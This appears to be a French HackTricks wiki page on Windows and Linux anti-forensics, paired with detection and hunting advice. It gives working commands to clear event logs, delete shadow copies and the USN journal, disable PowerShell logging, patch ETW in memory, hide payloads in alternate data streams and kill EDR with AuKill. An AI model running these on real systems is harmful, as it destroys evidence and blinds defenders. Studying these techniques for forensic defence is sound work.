# Techniques anti-forensics

{{#include ../../banners/hacktricks-training.md}}

## Horodatages

Un attaquant peut vouloir **modifier les horodatages des fichiers** afin d'éviter d'être détecté.\
Il est possible de trouver les horodatages dans la MFT, dans les attributs `$STANDARD_INFORMATION` \_\_ et \_\_ `$FILE_NAME`.

Les deux attributs contiennent 4 horodatages : **modification**, **accès**, **création** et **modification de l'enregistrement MFT** (MACE ou MACB).

**Windows explorer** et les autres outils affichent les informations provenant de **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

Cet outil **modifie** les informations d'horodatage dans **`$STANDARD_INFORMATION`**, **mais pas** les informations dans **`$FILE_NAME`**. Il est donc possible d'**identifier** une **activité** **suspecte**.

### Usnjrnl

Le **USN Journal** (Update Sequence Number Journal) est une fonctionnalité de NTFS (Windows NT file system) qui conserve un suivi des modifications du volume. L'outil [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) permet d'examiner ces modifications.

![TimeStomp - Anti-forensic Tool - Usnjrnl : Le USN Journal (Update Sequence Number Journal) est une fonctionnalité de NTFS (Windows NT file system) qui conserve un suivi des modifications du volume. L'...](<../../images/image (801).png>)

L'image précédente présente la **sortie** affichée par l'**outil**, où l'on peut observer que certaines **modifications ont été effectuées** sur le fichier.

### $LogFile

**Toutes les modifications de métadonnées d'un système de fichiers sont journalisées** dans un processus connu sous le nom de [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Les métadonnées journalisées sont conservées dans un fichier nommé `**$LogFile**`, situé à la racine d'un système de fichiers NTFS. Des outils tels que [LogFileParser](https://github.com/jschicht/LogFileParser) peuvent être utilisés pour analyser ce fichier et identifier les modifications.

![Usnjrnl - $LogFile : Toutes les modifications de métadonnées d'un système de fichiers sont journalisées dans un processus connu sous le nom de write-ahead logging. Les métadonnées journalisées sont conservées dans un fichier nommé $LogFile , situé à la racine...](<../../images/image (137).png>)

Une fois encore, la sortie de l'outil permet de voir que **certaines modifications ont été effectuées**.

Avec le même outil, il est possible d'identifier **à quel moment les horodatages ont été modifiés** :

![Usnjrnl - $LogFile : Avec le même outil, il est possible d'identifier à quel moment les horodatages ont été modifiés](<../../images/image (1089).png>)

- CTIME : date de création du fichier
- ATIME : date de modification du fichier
- MTIME : modification de l'enregistrement MFT du fichier
- RTIME : date d'accès au fichier

### Comparaison de `$STANDARD_INFORMATION` et `$FILE_NAME`

Une autre façon d'identifier les fichiers modifiés de manière suspecte consiste à comparer l'heure présente dans les deux attributs afin de rechercher des **incohérences**.

### Nanosecondes

Les horodatages **NTFS** ont une **précision** de **100 nanosecondes**. Ainsi, trouver des fichiers dont les horodatages ressemblent à 2010-10-10 10:10:**00.000:0000 est très suspect**.

### SetMace - Anti-forensic Tool

Cet outil peut modifier les deux attributs `$STARNDAR_INFORMATION` et `$FILE_NAME`. Cependant, depuis Windows Vista, un OS live est nécessaire pour modifier ces informations.

## Dissimulation de données

NFTS utilise un cluster et la taille minimale des informations. Cela signifie que si un fichier occupe un cluster et demi, **la moitié restante ne sera jamais utilisée** tant que le fichier n'est pas supprimé. Il est donc possible de **dissimuler des données dans cet espace libre**.

Il existe des outils tels que slacker qui permettent de dissimuler des données dans cet espace « caché ». Cependant, une analyse de `$logfile` et `$usnjrnl` peut révéler que certaines données ont été ajoutées :

![SetMace - Anti-forensic Tool - Dissimulation de données : Il existe des outils tels que slacker qui permettent de dissimuler des données dans cet espace « caché ». Cependant, une analyse de $logfile et $usnjrnl peut révéler que...](<../../images/image (1060).png>)

Il est ensuite possible de récupérer l'espace libre à l'aide d'outils tels que FTK Imager. Notez que ce type d'outil peut enregistrer le contenu de manière obfusquée, voire chiffrée.

## UsbKill

Il s'agit d'un outil qui **éteint l'ordinateur si une modification est détectée sur les ports USB**.\
Pour le découvrir, il est possible d'inspecter les processus en cours d'exécution et de **vérifier chaque script Python en cours d'exécution**.

## Distributions Linux live

Ces distributions sont **exécutées dans la mémoire RAM**. Le seul moyen de les détecter est **lorsque le système de fichiers NTFS est monté avec des autorisations d'écriture**. S'il est monté uniquement avec des autorisations de lecture, il ne sera pas possible de détecter l'intrusion.

## Suppression sécurisée

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Configuration de Windows

Il est possible de désactiver plusieurs méthodes de journalisation de Windows afin de rendre l'investigation forensics beaucoup plus difficile.

### Désactiver les horodatages - UserAssist

Il s'agit d'une clé de registre qui conserve les dates et heures auxquelles chaque exécutable a été exécuté par l'utilisateur.

La désactivation de UserAssist nécessite deux étapes :

1. Définir deux clés de registre, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` et `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, toutes deux à zéro afin d'indiquer que nous voulons désactiver UserAssist.
2. Effacer les sous-arborescences de votre registre qui ressemblent à `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Désactiver les horodatages - Prefetch

Cette fonctionnalité enregistre des informations sur les applications exécutées afin d'améliorer les performances du système Windows. Cependant, ces informations peuvent également être utiles dans le cadre d'analyses forensics.

- Exécuter `regedit`
- Sélectionner le chemin de fichier `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Cliquer avec le bouton droit sur `EnablePrefetcher` et `EnableSuperfetch`
- Sélectionner Modify pour chacun d'eux afin de modifier la valeur de 1 (ou 3) à 0
- Redémarrer

### Désactiver les horodatages - Last Access Time

Lorsqu'un dossier est ouvert depuis un volume NTFS sur un serveur Windows NT, le système enregistre l'heure pour **mettre à jour un champ d'horodatage sur chaque dossier répertorié**, appelé heure du dernier accès. Sur un volume NTFS fortement utilisé, cela peut affecter les performances.

1. Ouvrir l'Éditeur du Registre (Regedit.exe).
2. Accéder à `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Rechercher `NtfsDisableLastAccessUpdate`. Si cette valeur n'existe pas, ajouter ce DWORD et définir sa valeur à 1, ce qui désactivera le processus.
4. Fermer l'Éditeur du Registre et redémarrer le serveur.

### Supprimer l'historique USB

Toutes les **entrées des périphériques USB** sont stockées dans le registre Windows, sous la clé de registre **USBSTOR**, qui contient des sous-clés créées chaque fois qu'un périphérique USB est connecté à votre PC ou ordinateur portable. Cette clé se trouve ici : `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **La supprimer** supprimera l'historique USB.\
Vous pouvez également utiliser l'outil [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) pour vous assurer de les avoir supprimées (et pour les supprimer).

Un autre fichier qui conserve des informations sur les périphériques USB est le fichier `setupapi.dev.log` situé dans `C:\Windows\INF`. Celui-ci doit également être supprimé.

### Désactiver les Shadow Copies

**Lister** les Shadow Copies avec `vssadmin list shadowstorage`\
**Les supprimer** en exécutant `vssadmin delete shadow`

Vous pouvez également les supprimer via l'interface graphique en suivant les étapes proposées dans [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Pour désactiver les Shadow Copies [étapes tirées de cette page](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Ouvrir le programme Services en saisissant « services » dans la zone de recherche de texte après avoir cliqué sur le bouton Démarrer de Windows.
2. Dans la liste, rechercher « Volume Shadow Copy », le sélectionner, puis accéder aux propriétés en cliquant avec le bouton droit.
3. Choisir Disabled dans la liste déroulante « Startup type », puis confirmer la modification en cliquant sur Apply et OK.

Il est également possible de modifier dans le registre la configuration des fichiers qui seront copiés dans la Shadow Copy, à l'emplacement `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Écraser les fichiers supprimés

- Vous pouvez utiliser un **outil Windows** : `cipher /w:C` Cela demandera à cipher de supprimer toutes les données de l'espace disque inutilisé disponible sur le lecteur C.
- Vous pouvez également utiliser des outils tels que [**Eraser**](https://eraser.heidi.ie)

### Supprimer les journaux d'événements Windows

- Windows + R --> eventvwr.msc --> Développer « Windows Logs » --> Cliquer avec le bouton droit sur chaque catégorie et sélectionner « Clear Log »
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Désactiver les journaux d'événements Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Dans la section des services, désactiver le service « Windows Event Log »
- `WEvtUtil.exec clear-log` ou `WEvtUtil.exe cl`

### Désactiver $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Les versions récentes de Windows 10/11 et Windows Server conservent de **riches artefacts forensics PowerShell** sous
`Microsoft-Windows-PowerShell/Operational` (événements 4104/4105/4106).
Les attaquants peuvent les désactiver ou les effacer à la volée :
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Les défenseurs doivent surveiller les modifications apportées à ces clés de registre ainsi que la suppression en grand volume d’événements PowerShell.

### ETW (Event Tracing for Windows) Patch

Les produits de sécurité des endpoints dépendent fortement d’ETW. Une méthode d’évasion populaire en 2024 consiste à patcher `ntdll!EtwEventWrite`/`EtwEventWriteFull` en mémoire afin que chaque appel ETW retourne `STATUS_SUCCESS` sans émettre l’événement :<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Les PoCs publics (par ex. `EtwTiSwallow`) implémentent la même primitive en PowerShell ou en C++.
Comme le patch est **local au processus**, les EDR exécutés dans d’autres processus peuvent ne pas le détecter.<sup>[[5]](#references)</sup>
Détection : comparer `ntdll` en mémoire avec sa version sur disque, ou effectuer le hook avant le user-mode.

### Résurgence des Alternate Data Streams (ADS)

Des campagnes de malware en 2023 (par ex. les loaders de **FIN12**) ont été observées en train de dissimuler des binaires de second stage
dans des ADS afin d’échapper aux scanners traditionnels :
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Énumérez les streams avec `dir /R`, `Get-Item -Stream *` ou l’outil Sysinternals `streams64.exe`.
La copie du fichier hôte vers FAT/exFAT ou via SMB supprimera le stream caché et peut être utilisée
par les enquêteurs pour récupérer le payload.

### BYOVD & « AuKill » (2023)

Bring-Your-Own-Vulnerable-Driver est désormais couramment utilisé pour l’**anti-forensics** lors d’intrusions par ransomware.
L’outil open source **AuKill** charge un driver signé mais vulnérable (`procexp152.sys`) afin de
suspendre ou terminer les capteurs EDR et forensic **avant le chiffrement et la destruction des logs** :<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Le driver est ensuite supprimé, ne laissant que des artefacts minimes.<sup>[[1]](#references)</sup>
Mitigations : activer la Microsoft vulnerable-driver blocklist (HVCI/SAC),
et déclencher une alerte lors de la création d’un kernel-service depuis des chemins accessibles en écriture par l’utilisateur.

---

## Anti-Forensics sous Linux : Self-Patching et Cloud C2 (2023–2025)

### Self-patching de services compromis pour réduire la détection (Linux)
Les adversaires utilisent de plus en plus le “self-patching” d’un service juste après son exploitation, afin d’empêcher à la fois toute réexploitation et les détections fondées sur les vulnérabilités. L’idée consiste à remplacer les composants vulnérables par les derniers binaires/JARs légitimes en amont, afin que les scanners signalent que l’hôte est corrigé, tandis que la persistance et le C2 restent actifs.<sup>[[3]](#references)</sup>

Exemple : Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Après l’exploitation, les attaquants ont récupéré des JARs légitimes depuis Maven Central (repo1.maven.org), supprimé les JARs vulnérables de l’installation d’ActiveMQ, puis redémarré le broker.
- Cela a corrigé la RCE initiale tout en maintenant d’autres footholds (cron, modifications de la configuration SSH, implants C2 distincts).

Exemple opérationnel (illustratif)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Conseils de forensic/hunting
- Examinez les répertoires des services afin de détecter les remplacements non planifiés de binaires/JAR :
- Debian/Ubuntu : `dpkg -V activemq` et comparez les hashes/chemins des fichiers avec les miroirs des dépôts.
- RHEL/CentOS : `rpm -Va 'activemq*'`
- Recherchez les versions de JAR présentes sur le disque qui ne sont pas gérées par le gestionnaire de paquets, ou les liens symboliques mis à jour en dehors des procédures habituelles.
- Timeline : `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` afin de corréler le ctime/mtime avec la fenêtre de compromission.
- Historique du shell/télémétrie des processus : traces de `curl`/`wget` vers `repo1.maven.org` ou d’autres CDN d’artefacts immédiatement après l’exploitation initiale.
- Gestion des changements : vérifiez qui a appliqué le « patch » et pourquoi, et pas uniquement qu’une version corrigée est présente.

### C2 via un service cloud avec bearer tokens et stagers anti-analysis
Le tradecraft observé combinait plusieurs chemins C2 longue distance et un packaging anti-analysis :<sup>[[3]](#references)</sup>
- Loaders ELF PyInstaller protégés par mot de passe pour compliquer le sandboxing et l’analyse statique (par exemple, PYZ chiffré, extraction temporaire sous `/_MEI*`).
- Indicateurs : résultats de `strings` tels que `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Artefacts d’exécution : extraction vers `/tmp/_MEI*` ou vers des chemins personnalisés `--runtime-tmpdir`.
- C2 basé sur Dropbox utilisant des OAuth Bearer tokens codés en dur
- Marqueurs réseau : `api.dropboxapi.com` / `content.dropboxapi.com` avec `Authorization: Bearer <token>`.
- Recherchez dans les logs proxy/NetFlow/Zeek/Suricata les connexions HTTPS sortantes vers les domaines Dropbox depuis des workloads serveur qui ne synchronisent normalement pas de fichiers.
- C2 parallèle/de secours via tunneling (par exemple, Cloudflare Tunnel `cloudflared`), afin de conserver le contrôle si un canal est bloqué.
- IOC hôte : processus/unités `cloudflared`, configuration dans `~/.cloudflared/*.json`, connexions sortantes sur le port 443 vers les edge de Cloudflare.

### Persistence et « rollback du hardening » pour maintenir l’accès (exemples Linux)
Les attackers associent fréquemment l’auto-patching à des chemins d’accès persistants :<sup>[[3]](#references)</sup>
- Cron/Anacron : modifications du stub `0anacron` dans chaque répertoire `/etc/cron.*/` pour permettre une exécution périodique.
- Hunt :
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- Rollback du hardening de la configuration SSH : activation des connexions root et modification des shells par défaut des comptes à faibles privilèges.
- Recherchez l’activation des connexions root :
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Recherchez les shells interactifs suspects sur les comptes système (par exemple, `games`) :
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Artefacts de beacon aléatoires aux noms courts (8 caractères alphabétiques) déposés sur le disque et contactant également un C2 cloud :
- Hunt :
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Les defenders doivent corréler ces artefacts avec l’exposition externe et les événements de patching des services afin de découvrir l’auto-remédiation anti-forensic utilisée pour dissimuler l’exploitation initiale.

## References

- [1] [Sophos X-Ops – AuKill : un pilote vulnérable weaponized pour désactiver l’EDR (mars 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching d’EtwEventWrite pour la furtivité : détection et hunting (juin 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching for persistence : comment le malware Linux DripDropper se déplace dans le cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – RCE Apache ActiveMQ OpenWire (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Hiding Your .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
